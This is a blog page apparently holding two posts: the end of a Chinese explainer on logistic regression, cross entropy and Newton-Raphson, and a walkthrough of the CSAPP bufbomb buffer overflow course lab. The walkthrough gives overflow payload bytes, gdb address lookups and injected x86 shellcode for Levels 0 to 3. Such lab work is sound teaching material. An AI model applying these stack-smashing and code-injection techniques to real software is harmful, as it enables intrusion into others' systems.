   P(y=k|x; \beta) &=& \frac{e^{-\beta_k^T x}}{1+\sum_{i=1}^{K-1}e^{-\beta_i^T x}}\\
   P(y=K|x; \beta) &=& \frac{1}{1+\sum_{i=1}^{K-1}e^{-\beta_i^T x}}\\
   \end{array}
  \right.
\end{equation}
\tag 7$$<br>其中，$x \in R^p, \beta_k \in  R^{p+1}, k=1,2,...,K-1$。<br>这很像<strong>softmax回归</strong>，把(7)中的“1”替换成“$e^{-\beta_K^T x}$”就成了softmax回归。<br>$$P(y=k|x; \beta) = \frac{e^{-\beta_k^T x}}{\sum_{i=1}^Ke^{-\beta_i^T x}}, k=1,2,...,K \tag 8$$<br>softmax回归可以看做是logistic的推广。当然softmax回归并不是这么推倒出来的，它的建模过程有它自己的考虑，像logistic一样出于某种需求被逐步构建出，就像你做deep learning搭积木一样，是一种建模过程。你能根据模型的某种数学特点把他们归类在一起，比如GLM, tree。模型与模型间确定的推导关系是很难给出的, 至少我在写这个博客时还做不到。或者我该以另一种形式开头，如“人们找到一种叫做softmax的函数，它有这样那样的特点。。。”再写一篇博客。</p>
<h1 id="逻辑回归的求解"><a href="#逻辑回归的求解" class="headerlink" title="逻辑回归的求解"></a>逻辑回归的求解</h1><p>用最大似然估计法估计$\beta$, 令<br>$$p_i=P(y_i=1|x_i)=1-sigmoid(\beta^Tx_i)$$<br>则<br>$$P(y_i=0|x_i)=1-p_i=sigmoid(\beta^Tx_i)$$<br>那么似然函数为：<br>$$l(\beta)=\prod_{i=1}^np_i^{y_i}(1-p_i)^{1-y_i}$$<br>对数似然为：<br>$$L(\beta)=\log l(\beta)=\sum_{i=1}^ny_i\log p_i+(1-y_i)\log(1-p_i)\tag8$$<br>最大化$L(\beta)$即最小化$-L(\beta)$<br>$$-L(\beta)=-\log l(\beta)=\sum_{i=1}^n-y_i\log p_i-(1-y_i)\log(1-p_i)\tag9$$<br>(9)等号右边每一项为交叉熵（cross entropy）,因此对逻辑回归使用最大似然估计等价于最小化交叉熵，因此在神经网络中以交叉熵为损失函数求解二分类问题与最大似然估计是等价的。<br>这里只介绍一般逻辑回归的求解，回到(8), 将(6)(7)带入(8)得<br>$$L(\beta)=\sum_{i=1}^ny_i\beta^Tx_i-\log(1+exp(\beta^Tx_i))$$<br>令其梯度为0有<br>$$\frac{\partial L(\beta)}{\partial \beta}=\sum_{i=1}^nx_i(y_i-\frac{exp(\beta^Tx_i)}{1+exp(\beta^Tx_i)})=\sum_{i=1}^nx_i(y_i-p_i)=0\tag{10}$$<br>(10)是非线性方程组，难以求得$\beta$的解析解，可使用Newton-Raphson算法（牛顿迭代法）求解(10)的零点，Newton-Raphson算法需要(10)的导数，也就是$L(\beta)$的Hessian矩阵（二阶导数）<br>$$\frac{\partial L^2(\beta)}{\partial \beta \partial \beta^T}=-\sum_{i=1}^nx_ix_i^Tp_i(1-p_i)$$<br>因此Newton-Raphson算法每一步的迭代公式为：<br>$$\beta^{new}=\beta^{old}-\bigg(\frac{\partial L^2(\beta)}{\partial \beta \partial \beta^T}\Bigg|_{\beta^{old}}\bigg)^{-1}\frac{\partial L(\beta)}{\partial \beta}\Bigg|_{\beta^{old}}\tag{11}$$<br>可根据(11)迭代即可求解出(10)的零点$\beta$，同时也是(8)的极值点。</p>
<h1 id="最小化交叉熵损失与最大化似然函数"><a href="#最小化交叉熵损失与最大化似然函数" class="headerlink" title="最小化交叉熵损失与最大化似然函数"></a>最小化交叉熵损失与最大化似然函数</h1><p>最大化似然估计是显而易见的：<br>$$\max_{p_i} \sum_{i=1}^n y_i\log p_i+(1-y_i)\log(1-p_i)$$</p>
<p>那么，<strong>如何理解最小化交叉熵(互熵)损失</strong>?<br><br>假设给定x,y真实的分布服从0-1分布，假设y取1的真实条件分布为p(y|x)有，$y|x \sim p(y|x)$。我们所估计的条件分布为$\hat p(y|x)$。如果这两个分布很接近的话，他们的KL散度应该尽量小，那么可以最小化KL散度为目标，找到最接近$p(y|x)$的$\hat p(y|x)$：</p>

$$\begin{aligned}\min_{\hat p} D_{KL}(p \|\hat p)
  &= \min_{\hat p} E_p \log \frac{p(y|x)}{\hat p(y|x)} \\
  &= \min_{\hat p} \{E_p \log p(y|x) - E_p\log \hat p(y|x)\} \\
  &= \min_{\hat p} \{E_p \log p(y|x)\} + \min_{\hat p} \{- E_p\log \hat p(y|x)\} \\
  &= \min_{\hat p} \{-E_p\log \hat p(y|x)\} \\
\end{aligned} \tag{12}$$

<p>由于$E_p \log p(y|x)$与$\hat p$无关，所以式(12)的最后一个等号成立。其实根据交叉熵的定义，这是显而易见的:<br>$$H(p,\hat p)=H(p)+D_{KL}(p \| \hat p) \tag{13}$$</p>
<p>其中, $H(p,\hat p)$是分布p与分布$\hat p$的交叉熵，H(p)是分布p的信息熵。由于数据集已知，H(p)已知，所以最小化KL散度$D_{KL}(p \| \hat p)$等价于最小化交叉熵$H(p,\hat p)$.<br><br>把交叉熵展开，可得到最小化交叉熵与最大化似然函数等价：<br>
$$\begin{aligned}\min_{\hat p} \{-E_p\log \hat p(y|x)\}
  &= \min_{\hat p} \{-E_{y|x}\log \hat p(y|x)\} \\
  &= \min_{p_i} \frac{1}{n} \sum_{i=1}^n \bigg\{ \begin{matrix} -\log p_i & y_i=1|x_i \\ -\log (1-p_i) & y_i=0|x_i \end{matrix} \\
  &= \min_{p_i} \frac{1}{n} \sum_{i=1}^n -y_i\log p_i -(1-y_i)\log (1-p_i) \\
  &= \min_{p_i} \sum_{i=1}^n -y_i\log p_i -(1-y_i)\log (1-p_i) \\
  &= \max_{p_i} \sum_{i=1}^n y_i\log p_i +(1-y_i)\log (1-p_i) \\
\end{aligned} \tag{14}$$
</p>
<h1 id="以建模的遐想"><a href="#以建模的遐想" class="headerlink" title="以建模的遐想"></a>以$\log{{P(y=1|x)}\over {P(y=0|x)}}=\beta^Tx$建模的遐想</h1><p><strong>考虑任意样本$x_0$</strong>：</p>
<ul>
<li>若$x_0$属于1类的概率大于属于0类的概率，它应当在分类平面$\beta^Tx=0$的某一边，不妨设$\beta^Tx_0>0$；</li>
<li>若$x_0$属于0类的概率大于属于1类的概率，它应当在分类平面$\beta^Tx=0$的另一边，即$\beta^Tx_0 < 0$。</li>
</ul>
<p>换成数学的语言就是：</p>
<table>
<thead>
<tr>
<th>如果</th>
<th>那么</th>
</tr>
</thead>
<tbody>
<tr>
<td>$$\log{{P(y=1|x_0)}\over {P(y=0|x_0)}}>0$$</td>
<td>$$\beta^Tx_0>0$$</td>
</tr>
<tr>
<td>$$\log{{P(y=1|x_0)}\over {P(y=0|x_0)}} < 0$$</td>
<td>$$\beta^Tx_0 < 0$$</td>
</tr>
</tbody>
</table>
<p>只要$\log{{P(y=1|x_0)}\over {P(y=0|x_0)}}$和$\beta^Tx_0$同号就是我们想要的模型。<strong>Logistic直接以$\log{{P(y=1|x)}\over {P(y=0|x)}}=\beta^Tx$建模</strong>保证了这种同号的要求，但是这样建模多了一个副产品，就是“绝对值相等”——<br>$$|\log{{P(y=1|x_0)}\over {P(y=0|x_0)}}|=|\beta^Tx_0|\tag{15}$$<br>容易理解，$|\beta^Tx_0|$是$x_0$到分类平面$\beta^Tx=0$的距离，而$|\log{{P(y=1|x_0)}\over {P(y=0|x_0)}}|$是样本$x_0$属于于0，1类概率的对数比率（log-odd）。二者相等吗？<strong>样本到分类平面的距离与样本属于各类概率的对数比率大小相等</strong>吗？有可能碰到正好满足的样本，但是绝大多数情况下不相等。这是逻辑回归建模稍稍强加于实际模型的假设。</p>
<p>这些想法由ESL和<a href="https://www.zhihu.com/question/35322351/answer/141562541" target="_blank" rel="external">我在知乎中关于逻辑回归的回答</a>引申而来，我也没见过相关的文献，要是有相关的文献作为以上臆想的佐证或者驳斥，烦请通知我。</p>
<h1 id="Newton-Raphson算法-牛顿迭代法"><a href="#Newton-Raphson算法-牛顿迭代法" class="headerlink" title="Newton-Raphson算法(牛顿迭代法)"></a>Newton-Raphson算法(牛顿迭代法)</h1><div><br><iframe height="490" width="680" src="https://upload.wikimedia.org/wikipedia/commons/e/e0/NewtonIteration_Ani.gif"><br></iframe></div>



          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/csapp实验bufbomb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/04/01/csapp实验bufbomb/" itemprop="url">CSAPP实验bufbomb</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T10:06:00+08:00">
                2017-04-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/操作/" itemprop="url" rel="index">
                    <span itemprop="name">操作</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>bufbomb是一个很有意思的，带有游戏性质的缓冲区溢出实验, 能够帮助你加深理解《Computer Systems A Programmer’s Perspective》书中第三章《Machine-Level Representation of Programs》中的内容。<br>点 Self-Study Handout下载。<br>或者，到<a href="http://csapp.cs.cmu.edu/public/labs.html" target="_blank" rel="external">下载地址</a>找到Buffer Lab [Updated Sep 10, 2014] ( README, Writeup, Release Notes, Self-Study Handout )，点 Self-Study Handout下载。<br>解压命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -xvf buflab-handout.tar</div></pre></td></tr></table></figure>
<p>解压后阅读buflab.pdf了解实验内容。</p>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>运行./bufbomb 会让你输入一些字符串，这些字符串将存储在一个临时变量字符数组中。这个字符数组没有进行边界检测，所以你可以输入任意长的字符串，直至覆盖这个数组边界之外的内存位置，根据我们输入的字符串的内容我们可以让程序做一些我们希望它作的事情，比如修改函数返回地址，让程序跳转到我们给它安排的位置去执行我们所写的代码。当然了，这里的代码不可能用C之类的高级语言写了，在执行过程中程序实际执行的是机器码，我们可以写一些汇编代码，然后转化为机器码，把这些机器码再转换成ASCII码字符串，当程序提示我们输入的时候，我们再将这些准备好的字符串输入给程序。这就等于我们把自己写的代码写入了程序，让它按我们的意愿执行。<br>这里要用到几个工具，objdump, gcc和gdb还有实验提供的一个将16进制数转化为ASCII码的工具hex2raw, 不知为什么我下了几个版本linux都无法执行hex2raw，无奈之下自己写了个简单版本的hex2raw,只能用文件输入输出，勉强代替原hex2raw的重定向功能，管道功能我就不管了。顺带一提，这个实验须用32位版本的linux才能运行，下载linux发行版时要注意是不是32位系统，反正我安装的64位ubuntu连./bufbomb都运行不了。<br>你在执行./bufbomb时要输入一个id，id是你任意指定的，每个id解法有所不同，我用的id是yy。bufbomb这个游戏有几个级别，每完成一级任务游戏就会升级，升级是对应一个id的，你想重玩一遍可以用另外一个id开始。</p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>实验平台：Ubuntu 12.04 32bit<br>我们没有bufbomb的源代码，不知道程序里边的结构，只能利用反汇编工具objdump(苹果系统下没有objdump，可以用otool).指令如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$objdump -t bufbomb &gt; buf_table  //输出bufbomb的符号表到文本文件buf_table</div><div class="line">$objdump -d bufbomb &gt; buf_asm    //输出bufbomb的汇编代码到文本文件buf_asm</div></pre></td></tr></table></figure>
<p>我编写的hex2raw源代码本文末尾附录</p>
<h1 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h1><p>bufbomb.pdf 告诉你它会在test()函数中调用getbuf()函数获取你的字符串，如果getbuf()函数执行完后返回到test()你就输了，你要做的是让getbuf()返回（跳转）到smoke()函数的开始处，让程序执行smoke()。<br>在buf_asm的getbuf()代码段中我们看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048c0a: 8d 45 d8              lea    -0x28(%ebp),%eax</div><div class="line">8048c0d: 89 04 24              mov    %eax,(%esp)</div><div class="line">8048c10: e8 35 ff ff ff        call   8048b4a &lt;Gets&gt;</div></pre></td></tr></table></figure>
<p>可知，我们输入的字符串的首地址-0x28(%ebp)，它会传给%eax，然后作为Gets的参数，Gets负责把我们输入的字符串放在-0x28(%ebp)开始的内存块里。熟悉函数调用栈结构的你应该知道，函数的返回地址在ebp的上边一个存储单元，从buf_asm可以看出，这个程序的虚拟地址空间是32位，即4个字节，故返回地址在+0x4(%ebp)这个位置，我们要在这个位置写入smoke()的开始地址，查找我们事先存在buf_table的符号表，得到smoke()对应的地址是0x080490ba</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">+0x4(%ebp)-(-0x28((%ebp)) = +0x4+%ebp-(-0x28+%ebp) = +0x4+0x28 = 0x2c = 40</div></pre></td></tr></table></figure>
<p>因此我们输入的字符串要长40+4=44字节，前面的40个字节的字符帮助我们一路覆盖到返回地址之前，可以随便写，后边4个字节为我们指定的返回地址，即ba 90 04 08（0x080490ba的小端模式排列，即低位字节在前，高位字节在后），当程序执行完getbuf()后会跳转到这个地址去执行smoke()。</p>
<p>因此我们可以输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 ba 90 04 08</div></pre></td></tr></table></figure>
<p>我们可以在文件in0里写入上述十六进制数字，使用命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$./hex2raw in0 out0</div></pre></td></tr></table></figure>
<p>（如果你从网站上下载下来的hex2raw可以执行，就用bufbomb.psf里提到的格式输入指令）将这些十六进制数字转换成ASCII码并保存到文件out0中<br>hex2raw会自动忽略文件里的空格和换行，不必担心排列问题。有些ASCII码不可打印，所以如果你cat out0可能看不到几个字符。<br>接着，我们运行bufbomb输入我们的字符，在终端输入指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$./bufbomb &lt; out0 -u yy</div></pre></td></tr></table></figure>
<p>提示告诉我们</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:Smoke!: You called smoke() </div><div class="line">VAILD</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
<p>通过了！</p>
<h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>该级别的任务要求我们使bufbomb程序调用函数fizz()。<br>查找符号表的fizz()入口地址为0804906f. 我们可以用6f 90 04 08替换level0中输入的最后4个字节，实现跳转。但是，fizz()需要一个参数，当这个参数等于你的id对应的cookie时游戏才能顺利升级。使用指令(看实验指导，这个指令是实验材料给的)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$./makecookie yy</div></pre></td></tr></table></figure>
<p>得到我的id,yy,对应的cookie为0x2a50279f。因此我们要将2a50279f写入fizz的参数所在的内存位置。<br>查看fizz的汇编代码有下列指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">804906f: 55                     push   %ebp</div><div class="line">8049070: 89 e5                  mov    %esp,%ebp</div><div class="line">8049072: 83 ec 18               sub    $0x18,%esp</div><div class="line">8049075: 8b 45 08               mov    0x8(%ebp),%eax</div><div class="line">8049078: 3b 05 e4 c1 04 08      cmp    0x804c1e4,%eax</div><div class="line">804907e: 75 1e                  jne    804909e &lt;fizz+0x2f&gt;</div><div class="line">8049080: 89 44 24 04            mov    %eax,0x4(%esp)</div></pre></td></tr></table></figure>
<p>有条比较指令 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cmp 0x804c1e4,%eax</div></pre></td></tr></table></figure>
<p>比较寄存器eax和内存地址0x804c1e4的内容，查找符号表得知0x804c1e4存放的就是cookie,很明显我们的任务就是要使%eax里的内容等于0x2a50279f，由指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mov 0x8(%ebp),%eax</div></pre></td></tr></table></figure>
<p>可知fizz()的参数位置在0x8(%ebp)，它把参数给%eax，再与cookie比较。fizz()的操作将会在getbuf()结束后执行，在查看bud_asm, getbuf()结尾有代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">leave        //等价于 mov %ebp,%esp; pop %ebp </div><div class="line">ret          //等价于 pop PC</div></pre></td></tr></table></figure>
<p>可知栈顶指针寄存器%esp和帧指针寄存器%ebp已经回到bufbomb程序在调用getbuf()前的状态了。<br>由fizz的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mov %esp, %ebp</div></pre></td></tr></table></figure>
<p>可知此时的%ebp是上一个栈test()栈的栈顶，<br>由于我们不是call fizz，而是直接jmp到fizz,因而程序没有自动push返回地址入栈，%esp也没有自动-4，因此上一个栈的栈顶%esp应该在上一题返回地址所在位置的上边一个存储单元。也就是说，fizz()中的%ebp的位置是上一题的0x4(%ebp)+4 = 0x8(%ebp)，我们只要比上一题再多写8个字节就可以覆盖到fizz的参数存放位置了。后4个字节为我们的cookie——9f 27 50 2a(注意是0x2a50279f的小端模式)，要输入的十六进制数字如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 ba 90 04 08 00 00</div><div class="line">00 00 9f 27 50 2a</div></pre></td></tr></table></figure>
<p>把他们写入文本文件in1,输入命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$./hex2raw in1 out1</div><div class="line">$./bufbomb &lt; out1 -u yy</div></pre></td></tr></table></figure>
<p>终端提示:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:Fizz!: You called fizz(0x2a50279f)</div><div class="line">VAILD</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
<p>升到level2了！</p>
<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><p>该级的任务是要使程序跳转到bang(),bang的入口地址为0x08049022。在bang()中要比较全局变量global_value和cookie,只有当这个全局变量等于我们的cookie我们才能升级。因此我们的任务除了修改返回地址还要修改这个全局变量。<br>在符号表中查找global_value，得知它的存储地址为0x0804c1ec,并且我们有符号表得知它属于.bss段，属于未初始化的全局变量，在数据段中，基本处在该程序虚拟地址空间的底部，地址要远远小于我们能够通过输入字符串覆盖到的栈的区域，只能通过写入代码来修改。<br>在level0中，我们写入字符串的起始地址是-0x28(%ebp)，距离返回地址所在位置+0x4(%ebp)还有一段距离，我们可以把代码写在这个区间里。由代码来实现对global_value的修改和到bang()的跳转，然后再把返回地址改为我们写的代码的起始地址就行了。程序从getbuf返回后将跳到我们的代码，然后一句一句地执行我们的指令。<br>可是我们只知道字符串存放的相对位置-0x28(%ebp)，总不能把它写入返回地址里吧，而且在返回前我们什么也做不了，不能进行所需计算，只能通过gdb调试来得到字符存放的绝对地址了。注意getbuf有如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048c0a: 8d 45 d8             lea    -0x28(%ebp),%eax</div><div class="line">8048c0d: 89 04 24             mov    %eax,(%esp)</div><div class="line">8048c10: e8 35 ff ff ff       call   8048b4a &lt;Gets&gt;</div></pre></td></tr></table></figure>
<p>可知0x8048c0d:中的%eax就存着字符串的首地址，也就是我们写入的代码的首地址。<br>打开gdb,在终端输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$gdb bufbomb</div><div class="line">(gdb) b *0x8048c0d       //在地址0x8048c0d设置断点</div><div class="line">(gdb) r xxxxxxx -u yy    //随便输入点字符让程序运行到断点位置</div><div class="line">(gdb) p /x $eax          //以十六进制数字形式打印%eax中的内容</div></pre></td></tr></table></figure>
<p>我们得知 %eax = 0x55683ad8, 我们将以此作为getbuf()的返回地址（注意小端模式为d8 3a 68 55）。<br>下面用vi写我们的代码，文件名取.s结尾，我取作callbang.s，<br>终端输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi callbang.s</div></pre></td></tr></table></figure>
<p>进入vi, 输入代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov 0x804c1e4, %eax      //把cookie赋给%eax</div><div class="line">mov %eax, 0x804c1ec      //把%eax中的cookie赋给global_value</div><div class="line">push $0x8049022          //bang()地址入栈</div><div class="line">ret                      //返回，跳到bang()</div></pre></td></tr></table></figure>
<p>ret等效于pop PC,会让栈顶里的内容出栈，弹到程序计数器PC里，作为下一条要执行的指令。不要尝试使用call或者jmp $0x8049022，他俩事实上使用的是PC相对寻址，比较不容易设置正确。当然你也可以把0x8049022写到某个寄存器里，然后利用寄存器寻址跳到bang()。<br>在vi中输入:wq保存退出，回到终端。<br>有了代码，我们把它编译成目标文件，再用objdump -d 反汇编回来就能得到相应的机器码了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$gcc -m32 -c callbang.s</div><div class="line">$objdump -d callbang.o &gt; callbang_asm</div></pre></td></tr></table></figure>
<p>打开callbang_asm看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">callbang.o:     file format elf32-i386</div><div class="line">Disassembly of section .text:</div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0: a1 e4 c1 04 08       mov    0x804c1e4,%eax</div><div class="line">   5: a3 ec c1 04 08       mov    %eax,0x804c1ec</div><div class="line">   a: 68 22 90 04 08       push   $0x8049022</div><div class="line">   f: c3                            ret</div></pre></td></tr></table></figure>
<p>得到机器码为 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a1 e4 c1 04 08 a3 ec c1 04 08 68 22 90 04 08 c3</div></pre></td></tr></table></figure>
<p>你不用管每条指令的机器码有多长，cpu会自己断句的，我们只需把这些机器码紧密地写在一起就行了。因此我们需要给hex2raw转换的十六进制数字为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a1 e4 c1 04 08 a3 ec c1 04 08</div><div class="line">68 22 90 04 08 c3 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 d8 3a 68 55</div></pre></td></tr></table></figure>
<p>将它们写入文本文件in2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$./hex2raw in2 out2</div><div class="line">$./bufbomb &lt; out2 -u yy</div></pre></td></tr></table></figure>
<p>bufbomb输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:Bang!: You set global_value to 0x2a50279f</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
<p>好的，又升级了！</p>
<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><p>这一级的任务是使getbuf()结束后返回到test(),并将你的cookie作为getbuf()的返回值传给test()。同时恢复各个寄存器的状态，使test()察觉不到我们干了什么，就好像我们什么都没做一样。<br>首先我们要知道要恢复哪个寄存器，每一级我们都要从-0x28(%ebp)这个位置一路覆盖到返回地址+0x4(%ebp)，显然0x0(%ebp)这个位置也被我们的字符串覆盖了。我们知道，%ebp是callee栈的基址，也就是当前函数的帧指针；(%ebp)是这个基址位置里的内容，也是一个指针，指向caller栈的基址，即调用者的帧指针，在这里是test()的帧指针。当getbuf()返回时试图把(%ebp)恢复到%ebp，但(%ebp)里是我们输入的字符串，我们需要把test()的%ebp里的值找出来，再利用我们写入的指令把它重新赋给%ebp. 要找到原%ebp的值，这需要使用gdb,在test()的代码处设置断点，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$gdb bufbomb</div><div class="line">(gdb) b *0x8048c8b  (0x8048c8b是test()中call getbuf下一句的地址)</div><div class="line">Breakpoint 1 at 0x8048c8b</div><div class="line">(gdb) r xxxx -u yy</div><div class="line">Starting program: /media/psf/Home/Documents/csapplabs/3-buflab/bufbomb xxxx -u yy</div><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Breakpoint 1, 0x08048c8b in test ()</div><div class="line">(gdb) p /x $ebp</div><div class="line">$1 = 0x55683b30</div></pre></td></tr></table></figure>
<p>由此我们知道了test()中的ebp了.<br>接着，在buf_asm中查看test的汇编代码，有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">8048c8e: e8 71 ff ff ff       call   8048c04 &lt;getbuf&gt;</div><div class="line">8048c93: 89 c3                mov    %eax,%ebx</div></pre></td></tr></table></figure>
<p>得知getbuf()正确的返回地址为0x8048c93,我们还是用level2中push-ret的方法跳回test.可以着手写代码了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x2a50279f,%eax             //把我们的cookie值赋给%eax</div><div class="line">mov $0x55683b30,%ebp             //恢复test()的%ebp</div><div class="line">push $0x8048c93                  //推立即数0x8048c93入栈</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>保存为rettest.s</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$gcc -m32 -c rettest.s</div><div class="line">$objdump -d rettest.o &gt; rettest_asm</div></pre></td></tr></table></figure>
<p>查看rettest_asm得到我们的机器码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">rettest.o:     file format elf32-i386</div><div class="line">Disassembly of section .text:</div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0: b8 9f 27 50 2a         mov    $0x2a50279f,%eax</div><div class="line">   5: bd 30 3b 68 55         mov    $0x55683b30,%ebp</div><div class="line">   a: 68 93 8c 04 08         push   $0x8048c93</div><div class="line">   f: c3                              ret</div></pre></td></tr></table></figure>
